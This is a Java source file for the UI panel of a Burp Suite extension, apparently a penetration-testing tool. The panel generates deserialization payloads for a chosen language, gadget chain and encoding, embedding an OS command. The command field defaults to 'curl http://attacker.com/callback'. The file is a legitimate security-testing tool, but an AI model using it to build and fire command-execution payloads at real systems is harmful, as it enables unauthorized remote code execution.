package com.omnistrike.ui.modules;

import burp.api.montoya.MontoyaApi;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.model.Finding;
import com.omnistrike.modules.injection.deser.DeserPayloadGenerator;
import com.omnistrike.modules.injection.deser.DeserPayloadGenerator.Encoding;
import com.omnistrike.modules.injection.deser.DeserPayloadGenerator.Language;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;

import com.omnistrike.ui.CyberTheme;
import static com.omnistrike.ui.CyberTheme.*;

/**
 * Deserialization payload generator panel for OmniStrike.
 *
 * Pure payload generation — select language, chain, encoding, enter command,
 * generate payload with hex dump preview. No HTTP request input needed.
 */
public class DeserModulePanel extends JPanel {

    private static final String MODULE_ID = "deser-scanner";

    private final transient MontoyaApi api;
    private final transient FindingsStore findingsStore;

    private final JComboBox<Language> languageCombo;
    private final JComboBox<String> chainCombo;
    private final JLabel chainLabel;
    private final JComboBox<String> formatterCombo;
    private final JLabel formatterLabel;
    private final JComboBox<String> phpFunctionCombo;
    private final JLabel phpFunctionLabel;
    private final JComboBox<Encoding> encodingCombo;
    private final JTextField commandField;
    private final JTextArea previewArea;
    private final JLabel chainDescLabel;

    // Findings table
    private final DefaultTableModel findingsTableModel;
    private final List<Finding> findingsList = new ArrayList<>();
    private final javax.swing.Timer autoRefreshTimer;
    private int lastKnownFindingsCount = 0;

    public DeserModulePanel(MontoyaApi api, FindingsStore findingsStore) {
        super(new BorderLayout(0, 6));
        setBackground(BG_DARK);
        setBorder(BorderFactory.createEmptyBorder(10, 12, 10, 12));
        this.api = api;
        this.findingsStore = findingsStore;

        // ── Controls: Language, Chain, Encoding ─────────────────────────────
        languageCombo = new JComboBox<>(Language.values());
        CyberTheme.styleComboBox(languageCombo);

        chainCombo = new JComboBox<>();
        CyberTheme.styleComboBox(chainCombo);
        chainCombo.setPreferredSize(new Dimension(280, 28));

        chainLabel = label("Chain:");

        formatterCombo = new JComboBox<>();
        CyberTheme.styleComboBox(formatterCombo);
        formatterCombo.setPreferredSize(new Dimension(200, 28));

        formatterLabel = label("Formatter:");
        formatterLabel.setVisible(false);
        formatterCombo.setVisible(false);

        phpFunctionCombo = new JComboBox<>();
        CyberTheme.styleComboBox(phpFunctionCombo);
        phpFunctionCombo.setPreferredSize(new Dimension(160, 28));
        phpFunctionLabel = label("Function:");
        phpFunctionLabel.setVisible(false);
        phpFunctionCombo.setVisible(false);

        encodingCombo = new JComboBox<>(Encoding.values());
        CyberTheme.styleComboBox(encodingCombo);

        JPanel row1 = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
        row1.setBackground(BG_DARK);
        row1.add(label("Language:"));
        row1.add(languageCombo);
        row1.add(chainLabel);
        row1.add(chainCombo);
        row1.add(formatterLabel);
        row1.add(formatterCombo);
        row1.add(phpFunctionLabel);
        row1.add(phpFunctionCombo);
        row1.add(label("Encoding:"));
        row1.add(encodingCombo);

        // ── Chain description label ─────────────────────────────────────────
        chainDescLabel = new JLabel(" ");
        chainDescLabel.setFont(MONO_SMALL);
        chainDescLabel.setForeground(FG_SECONDARY);
        chainDescLabel.setBorder(BorderFactory.createEmptyBorder(0, 12, 0, 0));

        // ── Command field ───────────────────────────────────────────────────
        commandField = new JTextField("curl http://attacker.com/callback", 40);
        CyberTheme.styleTextField(commandField);
        commandField.setToolTipText("OS command or callback URL for the payload");

        JPanel row2 = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
        row2.setBackground(BG_DARK);
        row2.add(label("Command:"));
        row2.add(commandField);

        // ── Buttons ─────────────────────────────────────────────────────────
        JButton generateBtn = new JButton("Generate Payload");
        CyberTheme.styleFilledButton(generateBtn, NEON_GREEN);
        generateBtn.setToolTipText("Generate the deserialization payload");

        JButton copyB64Btn = new JButton("Copy Base64");
        CyberTheme.styleButton(copyB64Btn, NEON_CYAN);
        copyB64Btn.setToolTipText("Copy base64-encoded payload to clipboard");

        JButton copyRawBtn = new JButton("Copy Raw");
        CyberTheme.styleButton(copyRawBtn, NEON_CYAN);
        copyRawBtn.setToolTipText("Copy raw payload text to clipboard");

        JButton clearBtn = new JButton("Clear");
        CyberTheme.styleButton(clearBtn, NEON_RED);

        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        btnPanel.setBackground(BG_DARK);
        btnPanel.add(generateBtn);
        btnPanel.add(copyB64Btn);
        btnPanel.add(copyRawBtn);
        btnPanel.add(clearBtn);

        // ── Top section ─────────────────────────────────────────────────────
        JPanel topSection = new JPanel();
        topSection.setBackground(BG_DARK);
        topSection.setLayout(new BoxLayout(topSection, BoxLayout.Y_AXIS));
        topSection.add(row1);
        topSection.add(chainDescLabel);
        topSection.add(row2);
        topSection.add(btnPanel);

        // ── Payload preview (dark terminal style) ───────────────────────────
        previewArea = new JTextArea(18, 60);
        previewArea.setEditable(false);
        previewArea.setFont(MONO_BOLD.deriveFont(13f));
        previewArea.setBackground(BG_DARK);
        previewArea.setForeground(NEON_GREEN);
        previewArea.setCaretColor(NEON_GREEN);
        previewArea.setLineWrap(true);
        previewArea.setWrapStyleWord(true);

        // ── Preview color selector ───────────────────────────────────────────
        JPanel colorPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        colorPanel.setBackground(BG_DARK);
        colorPanel.add(label("Text Color:"));
        ButtonGroup colorGroup = new ButtonGroup();
        JRadioButton greenRadio = new JRadioButton("Green");
        JRadioButton redRadio = new JRadioButton("Red");
        JRadioButton blueRadio = new JRadioButton("Blue");
        JRadioButton whiteRadio = new JRadioButton("White");
        greenRadio.setSelected(true);
        CyberTheme.styleRadioButton(greenRadio);
        greenRadio.setForeground(NEON_GREEN);
        CyberTheme.styleRadioButton(redRadio);
        redRadio.setForeground(NEON_RED);
        CyberTheme.styleRadioButton(blueRadio);
        blueRadio.setForeground(NEON_BLUE);
        CyberTheme.styleRadioButton(whiteRadio);
        whiteRadio.setForeground(FG_PRIMARY);
        colorGroup.add(greenRadio);
        colorGroup.add(redRadio);
        colorGroup.add(blueRadio);
        colorGroup.add(whiteRadio);
        colorPanel.add(greenRadio);
        colorPanel.add(redRadio);
        colorPanel.add(blueRadio);
        colorPanel.add(whiteRadio);

        java.awt.event.ActionListener colorAction = e -> {
            Color c;
            if (redRadio.isSelected()) c = NEON_RED;
            else if (blueRadio.isSelected()) c = NEON_BLUE;
            else if (whiteRadio.isSelected()) c = FG_PRIMARY;
            else c = NEON_GREEN;
            previewArea.setForeground(c);
            previewArea.setCaretColor(c);
        };
        greenRadio.addActionListener(colorAction);
        redRadio.addActionListener(colorAction);
        blueRadio.addActionListener(colorAction);
        whiteRadio.addActionListener(colorAction);

        JPanel previewWrapper = new JPanel(new BorderLayout());
        previewWrapper.setBackground(BG_DARK);
        previewWrapper.add(colorPanel, BorderLayout.NORTH);
        JScrollPane previewScroll = new JScrollPane(previewArea);
        CyberTheme.styleScrollPane(previewScroll);
        previewWrapper.add(previewScroll, BorderLayout.CENTER);
        CyberTheme.styleTitledBorder(previewWrapper, "Payload Preview", NEON_CYAN);

        // ── Findings table ──────────────────────────────────────────────────
        findingsTableModel = new DefaultTableModel(
                new String[]{"Severity", "Title", "URL", "Parameter", "Time"}, 0) {
            @Override public boolean isCellEditable(int r, int c) { return false; }
        };
        JTable findingsTable = new JTable(findingsTableModel);
        CyberTheme.styleTable(findingsTable);
        findingsTable.setAutoCreateRowSorter(true);
        findingsTable.getColumnModel().getColumn(0).setCellRenderer(CyberTheme.createSeverityRenderer());

        JTextArea findingsDetailArea = new JTextArea(4, 60);
        findingsDetailArea.setEditable(false);
        CyberTheme.styleTextArea(findingsDetailArea);
        findingsDetailArea.setLineWrap(true);

        findingsTable.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                int row = findingsTable.getSelectedRow();
                if (row >= 0) {
                    int modelRow = findingsTable.convertRowIndexToModel(row);
                    if (modelRow >= 0 && modelRow < findingsList.size()) {
                        Finding f = findingsList.get(modelRow);
                        findingsDetailArea.setText(
                                "Evidence: " + (f.getEvidence() != null ? f.getEvidence() : "") +
                                "\nDescription: " + (f.getDescription() != null ? f.getDescription() : "") +
                                "\nRemediation: " + (f.getRemediation() != null ? f.getRemediation() : ""));
                        findingsDetailArea.setCaretPosition(0);
                    }
                }
            }
        });

        // Right-click on findings table
        JPopupMenu findingsPopup = new JPopupMenu();
        JMenuItem sendToRepeater = new JMenuItem("Send to Repeater");
        sendToRepeater.addActionListener(e -> {
            int row = findingsTable.getSelectedRow();
            if (row < 0) return;
            int modelRow = findingsTable.convertRowIndexToModel(row);
            if (modelRow < 0 || modelRow >= findingsList.size()) return;
            Finding f = findingsList.get(modelRow);
            if (f.getRequestResponse() != null && f.getRequestResponse().request() != null) {
                api.repeater().sendToRepeater(f.getRequestResponse().request(),
                        "Deser: " + truncate(f.getTitle(), 30));
            }
        });
        findingsPopup.add(sendToRepeater);
        findingsTable.setComponentPopupMenu(findingsPopup);

        // ── Bottom tabs: Preview + Findings ─────────────────────────────────
        JTabbedPane toolTabs = new JTabbedPane();
        CyberTheme.styleTabbedPane(toolTabs);
        toolTabs.addTab("Payload Preview", previewWrapper);

        JScrollPane findingsTableScroll = new JScrollPane(findingsTable);
        CyberTheme.styleScrollPane(findingsTableScroll);
        JScrollPane findingsDetailScroll = new JScrollPane(findingsDetailArea);
        CyberTheme.styleScrollPane(findingsDetailScroll);

        JSplitPane findingsSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT,
                findingsTableScroll, findingsDetailScroll);
        CyberTheme.styleSplitPane(findingsSplit);
        findingsSplit.setResizeWeight(0.6);
        findingsSplit.setDividerLocation(200);
        toolTabs.addTab("Findings (" + findingsList.size() + ")", findingsSplit);

        // ── Main layout ─────────────────────────────────────────────────────
        JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT,
                topSection, toolTabs);
        CyberTheme.styleSplitPane(mainSplit);
        mainSplit.setResizeWeight(0.15);
        mainSplit.setDividerLocation(140);

        add(mainSplit, BorderLayout.CENTER);

        // ── Wire events ─────────────────────────────────────────────────────
        populateChains();
        updateChainDescription();
        languageCombo.addActionListener(e -> { populateChains(); updateChainDescription(); });
        chainCombo.addActionListener(e -> { populateFormatters(); updateChainDescription(); });

        generateBtn.addActionListener(e -> generatePayload());
        copyB64Btn.addActionListener(e -> copyBase64());
        copyRawBtn.addActionListener(e -> copyRaw());
        clearBtn.addActionListener(e -> previewArea.setText(""));

        // Auto-refresh findings every 3 seconds
        autoRefreshTimer = new javax.swing.Timer(3000, e -> autoRefreshFindings(toolTabs));
        autoRefreshTimer.start();
    }

    /** Stop timers on extension unload. */
    public void stopTimers() {
        if (autoRefreshTimer != null) {
            autoRefreshTimer.stop();
        }
    }

    // ── Chain population ──────────────────────────────────────────────────────

    private void populateChains() {
        Language lang = (Language) languageCombo.getSelectedItem();
        if (lang == null) return;

        chainCombo.removeAllItems();

        if (lang == Language.DOTNET) {
            chainLabel.setText("Gadget:");
            Map<String, String> gadgets = DeserPayloadGenerator.getDotNetGadgets();
            for (String name : gadgets.keySet()) {
                chainCombo.addItem(name);
            }
            formatterLabel.setVisible(true);
            formatterCombo.setVisible(true);
            phpFunctionLabel.setVisible(false);
            phpFunctionCombo.setVisible(false);
            populateFormatters();
        } else if (lang == Language.PHP) {
            chainLabel.setText("Chain:");
            Map<String, String> chains = DeserPayloadGenerator.getAvailableChains(lang);
            for (String name : chains.keySet()) {
                chainCombo.addItem(name);
            }
            formatterLabel.setVisible(false);
            formatterCombo.setVisible(false);
            phpFunctionLabel.setVisible(true);
            phpFunctionCombo.setVisible(true);
            populatePhpFunctions();
        } else {
            chainLabel.setText("Chain:");
            Map<String, String> chains = DeserPayloadGenerator.getAvailableChains(lang);
            for (String name : chains.keySet()) {
                chainCombo.addItem(name);
            }
            formatterLabel.setVisible(false);
            formatterCombo.setVisible(false);
            phpFunctionLabel.setVisible(false);
            phpFunctionCombo.setVisible(false);
        }
    }

    private void populatePhpFunctions() {
        phpFunctionCombo.removeAllItems();
        for (String fn : DeserPayloadGenerator.getPhpFunctions()) {
            phpFunctionCombo.addItem(fn);
        }
    }

    private void populateFormatters() {
        Language lang = (Language) languageCombo.getSelectedItem();
        if (lang != Language.DOTNET) return;

        String gadget = (String) chainCombo.getSelectedItem();
        formatterCombo.removeAllItems();
        if (gadget != null) {
            for (String fmt : DeserPayloadGenerator.getDotNetFormatters(gadget)) {
                formatterCombo.addItem(fmt);
            }
        }
    }

    private void updateChainDescription() {
        Language lang = (Language) languageCombo.getSelectedItem();
        String chain = (String) chainCombo.getSelectedItem();
        if (lang == null || chain == null) {
            chainDescLabel.setText(" ");
            return;
        }
        String desc;
        if (lang == Language.DOTNET) {
            Map<String, String> gadgets = DeserPayloadGenerator.getDotNetGadgets();
            desc = gadgets.get(chain);
        } else {
            Map<String, String> chains = DeserPayloadGenerator.getAvailableChains(lang);
            desc = chains.get(chain);
        }
        chainDescLabel.setText(desc != null ? desc : " ");
    }

    // ── Payload generation ────────────────────────────────────────────────────

    private byte[] lastGeneratedPayload;

    private void generatePayload() {
        Language lang = (Language) languageCombo.getSelectedItem();
        String chain = (String) chainCombo.getSelectedItem();
        Encoding enc = (Encoding) encodingCombo.getSelectedItem();
        String command = commandField.getText().trim();
        String formatter = (String) formatterCombo.getSelectedItem();

        if (lang == null || chain == null || command.isEmpty()) {
            JOptionPane.showMessageDialog(this,
                    "Please select language, chain, and enter a command.",
                    "Generate Payload", JOptionPane.WARNING_MESSAGE);
            return;
        }

        try {
            byte[] payload;
            String headerExtra;
            String phpFunction = (String) phpFunctionCombo.getSelectedItem();
            if (lang == Language.DOTNET && formatter != null && !formatter.isEmpty()) {
                payload = DeserPayloadGenerator.generate(lang, chain, formatter, command, enc);
                headerExtra = " | Gadget: " + chain + " | Formatter: " + formatter;
            } else if (lang == Language.PHP && phpFunction != null && !phpFunction.isEmpty()) {
                payload = DeserPayloadGenerator.generate(lang, chain, phpFunction, command, enc);
                headerExtra = " | Chain: " + chain + " | Function: " + phpFunction;
            } else {
                payload = DeserPayloadGenerator.generate(lang, chain, command, enc);
                headerExtra = " | Chain: " + chain;
            }
            lastGeneratedPayload = payload;

            String hexDump = DeserPayloadGenerator.toHexDump(payload, 1024);
            String payloadText = new String(payload, StandardCharsets.UTF_8);
            String truncatedText = payloadText.length() > 2000
                    ? payloadText.substring(0, 2000) + "\n... (truncated)" : payloadText;

            StringBuilder preview = new StringBuilder();
            preview.append("Language: ").append(lang).append(headerExtra)
                   .append(" | Encoding: ").append(enc)
                   .append(" | Size: ").append(payload.length).append(" bytes\n")
                   .append("═══════════════════════════════════════════════════════════════\n\n");

            switch (enc) {
                case RAW -> {
                    preview.append("── Payload (raw) ─────────────────────────────────────────────\n")
                           .append(truncatedText).append("\n\n")
                           .append("── Base64 (copy-paste ready) ─────────────────────────────────\n")
                           .append(java.util.Base64.getEncoder().encodeToString(payload)).append("\n\n");
                }
                case BASE64 -> {
                    preview.append("── Payload (base64-encoded) ──────────────────────────────────\n")
                           .append(truncatedText).append("\n\n");
                }
                case URL_ENCODED -> {
                    preview.append("── Payload (URL-encoded) ─────────────────────────────────────\n")
                           .append(truncatedText).append("\n\n");
                }
                case BASE64_URL_ENCODED -> {
                    preview.append("── Payload (base64 + URL-encoded) ────────────────────────────\n")
                           .append(truncatedText).append("\n\n");
                }
            }

            preview.append("── Hex Dump ──────────────────────────────────────────────────\n")
                   .append(hexDump);

            previewArea.setText(preview.toString());
            previewArea.setCaretPosition(0);
        } catch (Exception e) {
            previewArea.setText("[!] Generation failed: " + e.getMessage());
            lastGeneratedPayload = null;
        }
    }

    private void copyBase64() {
        if (lastGeneratedPayload == null) {
            JOptionPane.showMessageDialog(this, "Generate a payload first.",
                    "Copy", JOptionPane.INFORMATION_MESSAGE);
            return;
        }
        String b64 = java.util.Base64.getEncoder().encodeToString(lastGeneratedPayload);
        Toolkit.getDefaultToolkit().getSystemClipboard()
                .setContents(new StringSelection(b64), null);
    }

    private void copyRaw() {
        if (lastGeneratedPayload == null) {
            JOptionPane.showMessageDialog(this, "Generate a payload first.",
                    "Copy", JOptionPane.INFORMATION_MESSAGE);
            return;
        }
        String raw = new String(lastGeneratedPayload, StandardCharsets.UTF_8);
        Toolkit.getDefaultToolkit().getSystemClipboard()
                .setContents(new StringSelection(raw), null);
    }

    // ── Findings auto-refresh ─────────────────────────────────────────────────

    private void autoRefreshFindings(JTabbedPane tabs) {
        SwingUtilities.invokeLater(() -> {
            List<Finding> current = findingsStore.getFindingsByModule(MODULE_ID);
            if (current.size() != lastKnownFindingsCount) {
                lastKnownFindingsCount = current.size();
                findingsTableModel.setRowCount(0);
                findingsList.clear();
                SimpleDateFormat fmt = new SimpleDateFormat("HH:mm:ss");
                for (Finding f : current) {
                    findingsList.add(f);
                    findingsTableModel.addRow(new Object[]{
                            f.getSeverity() != null ? f.getSeverity().name() : "",
                            f.getTitle() != null ? f.getTitle() : "",
                            f.getUrl() != null ? f.getUrl() : "",
                            f.getParameter() != null ? f.getParameter() : "",
                            fmt.format(new java.util.Date(f.getTimestamp()))
                    });
                }
                for (int i = 0; i < tabs.getTabCount(); i++) {
                    if (tabs.getTitleAt(i).startsWith("Findings")) {
                        tabs.setTitleAt(i, "Findings (" + current.size() + ")");
                        break;
                    }
                }
            }
        });
    }

    // ── UI helpers ────────────────────────────────────────────────────────────

    private static JLabel label(String text) {
        JLabel l = new JLabel(text);
        l.setForeground(NEON_CYAN);
        l.setFont(MONO_BOLD);
        return l;
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
